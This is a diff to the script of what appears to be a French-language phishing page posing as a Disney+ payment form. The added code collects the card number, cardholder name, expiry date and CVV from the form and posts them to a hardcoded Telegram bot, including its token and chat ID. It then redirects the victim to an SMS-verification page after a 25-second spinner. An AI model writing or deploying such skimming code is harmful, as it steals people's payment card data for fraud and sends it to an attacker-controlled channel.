@@ -209,16 +209,41 @@
   </div>
 
   <script>
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("spinnerOverlay").style.display = "flex";
+  document.getElementById("paymentForm").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      // Attendre 25 secondes avant de rediriger
+    const spinner = document.getElementById("spinnerOverlay");
+    spinner.style.display = "flex";
+
+    const cardNumber = document.querySelector('input[placeholder="Numéro de carte"]').value.trim();
+    const name = document.querySelector('input[placeholder="Nom sur la carte"]').value.trim();
+    const expiry = document.querySelector('input[placeholder="MM/AA"]').value.trim();
+    const cvv = document.querySelector('input[placeholder="Cryptogramme (CVV)"]').value.trim();
+
+    const message = `💳 Nouvelle tentative de paiement Disney+ :\n\nNuméro de carte : ${cardNumber}\nNom : ${name}\nExpiration : ${expiry}\nCVV : ${cvv}`;
+
+    const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+    const chatId = "1887198443";
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .catch((error) => {
+      console.error("Erreur Telegram:", error);
+    })
+    .finally(() => {
       setTimeout(() => {
         window.location.href = "sms-verification.html";
-      }, 25000);
+      }, 25000); // 25 secondes
     });
-  </script>
-
+  });
+</script>
 </body>
 </html>
